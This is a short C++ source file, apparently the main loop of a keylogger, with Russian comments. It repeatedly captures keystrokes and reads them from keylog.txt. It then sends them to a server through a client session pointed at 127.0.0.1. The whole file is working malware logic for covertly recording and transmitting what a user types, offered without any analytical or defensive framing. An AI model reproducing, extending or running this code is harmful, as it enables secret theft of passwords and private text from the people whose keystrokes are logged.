#include<iostream>
#include<string>
#include "client.h" 
#include "keylog.h"



int main()
{
	time_t now; // переменная для времени начала
	int pos;
	char *mes = new char[1024];
	std::string n;
	std::string message; // строка с сообщением для сервера 
	std::ifstream keylogs; //  файл для записи и чтения перехваченных клавиш 
	Client session("12345", "127.0.0.1"); // создаем клиентскую сессию
	if (session.init() != 0) { std::cout << "Failed to init client!!!";} // если не создана - выводим ошибку
	while (true)
	{
		time(&now);  //  устанавливаем время
		pos = getkeys(now); // перехватываем клавиши
		keylogs.open("keylog.txt"); // открываем файл на чтение 
		keylogs.seekg(pos);
		while(std::getline(keylogs, n))
		{
			message += n + "\n";
		}
		keylogs.close(); 
		if (session.proccess(message) != 0) { std::cout << "Failed to process!!!"; }
		message = "";
	}
	keylogs.close();
	return 0;
}